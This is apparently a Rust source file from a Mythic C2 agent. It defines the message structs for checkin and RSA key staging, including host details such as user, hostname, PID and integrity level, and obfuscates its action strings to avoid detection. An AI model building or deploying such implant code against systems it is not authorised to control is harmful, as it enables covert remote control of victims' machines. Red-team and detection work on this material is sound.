// use std::str::FromStr;

use serde::{Deserialize, Serialize};
// use uuid::Uuid;

// use crate::MythicError;

pub const ACTION_STAGING_RSA: &str = "staging_rsa";
pub const ACTION_STAGING_TRANSLATION: &str = "staging_translation";
pub const ACTION_TRANSLATION_STAGING: &str = "translation_staging";
pub const ACTION_GET_TASKING: &str = "get_tasking";
pub const ACTION_POST_RESPONSE: &str = "post_response";

/// Standard checkin request — matches the official Mythic JSON schema.
///
/// ```json
/// {
///     "action": "checkin",
///     "uuid": "payload uuid",
///     "ips": ["127.0.0.1"],
///     "os": "macOS 10.15",
///     "user": "its-a-feature",
///     "host": "spooky.local",
///     "pid": 4444,
///     "architecture": "x64",
///     "domain": "test",
///     "integrity_level": 3,
///     "external_ip": "8.8.8.8",
///     "encryption_key": "base64 of key",
///     "decryption_key": "base64 of key",
///     "process_name": "osascript"
/// }
/// ```
#[derive(Debug, Serialize, Deserialize, Default)]
pub struct ReqCheckin {
    pub action: String,
    pub uuid: String,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub ips: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub os: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub pid: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub architecture: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub domain: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub integrity_level: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub external_ip: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub encryption_key: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub decryption_key: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub process_name: Option<String>,
}

impl ReqCheckin {
    pub fn default(uuid: &str) -> Self {
        let uuid = uuid.to_string();
        Self {
            action: obfstring!("checkin"),
            uuid,
            ..Default::default()
        }
    }

    #[allow(clippy::too_many_arguments)]
    pub fn new(
        uuid: &str,
        ips: Vec<String>,
        os: Option<String>,
        user: Option<String>,
        host: Option<String>,
        pid: Option<u32>,
        architecture: Option<String>,
        domain: Option<String>,
        integrity_level: Option<u32>,
        external_ip: Option<String>,
        encryption_key: Option<String>,
        decryption_key: Option<String>,
        process_name: Option<String>,
    ) -> Self {
        let req = Self::default(uuid);
        Self {
            action: req.action,
            uuid: req.uuid,
            ips,
            os,
            user,
            host,
            pid,
            architecture,
            domain,
            integrity_level,
            external_ip,
            encryption_key,
            decryption_key,
            process_name,
        }
    }
}

#[derive(Debug, Serialize, Deserialize)]
pub struct RespCheckin {
    pub action: String,
    pub id: String,
    pub status: String,
}

impl RespCheckin {
    pub fn new(id: String, status: String) -> Self {
        Self {
            action: obfstring!("checkin"),
            id,
            status,
        }
    }

    pub fn success(id: String) -> Self {
        Self::new(id, obfstring!("success"))
    }
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ReqStagingRSA {
    pub action: String,
    pub pub_key: String,
    pub session_id: String,
}

impl ReqStagingRSA {
    pub fn new(pub_key: String, session_id: String) -> Self {
        Self {
            action: obfstring!("staging_rsa"),
            pub_key,
            session_id,
        }
    }
}

#[derive(Debug, Serialize, Deserialize)]
pub struct RespStagingRSA {
    pub action: String,
    pub uuid: String,
    pub session_key: String,
    pub session_id: String,
}

impl RespStagingRSA {
    pub fn new(uuid: String, session_key: String, session_id: String) -> Self {
        Self {
            action: obfstring!("staging_rsa"),
            uuid,
            session_key,
            session_id,
        }
    }
}
